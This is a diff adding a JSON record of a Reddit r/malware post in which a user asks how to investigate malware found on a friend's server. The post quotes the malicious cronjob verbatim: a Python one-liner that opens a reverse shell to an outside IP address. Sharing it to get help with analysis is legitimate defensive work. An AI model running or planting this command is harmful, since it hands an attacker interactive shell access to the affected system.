@@ -1,0 +1,21 @@
+{
+    "op": {
+        "upvote_ratio": null,
+        "selftext": "My friend got himself, some malware onto his server and currently, it pulls some command over a socket connection via `python -c` into `/bin/sh -i`how can I \"reverse engineer\" this type of malware ? \n\nI tried to curl the ip and port, to see what would load, but  connection was refused. `nmap` revealed only ssh to be open in the \"default\" port range.\n\nAbout the server, he is going to set it up completely new, I think he can wager himself luck he didnt get no ransomware.\n\nI wont post IP and port for now, but can if I get green light. \n\n\nEdit: \ncronjob:\n\n&gt;/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"108.166.215.68\",103));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\nnmap on the ip does nothign interesting.\n\nssh on a ubuntu system open, skiddie suspicion rising.\n\ncouple of other ports open but none respond to anything, neither `nc` nor `curl`",
+        "title": "How do I find out what this malware script does.",
+        "score": 32,
+        "id": "5rgk2t",
+        "commsNum": 16,
+        "timeStamp": "2017/02/01-08:46:38",
+        "author_name": "ZettTheArcWarden",
+        "is_self": true,
+        "locked": false,
+        "num_comments": 16,
+        "over_18": false,
+        "spoiler": false,
+        "subreddit": "malware",
+        "stickied": false,
+        "url": "https://www.reddit.com/r/Malware/comments/5rgk2t/how_do_i_find_out_what_this_malware_script_does/"
+    },
+    "posts": {}
+}
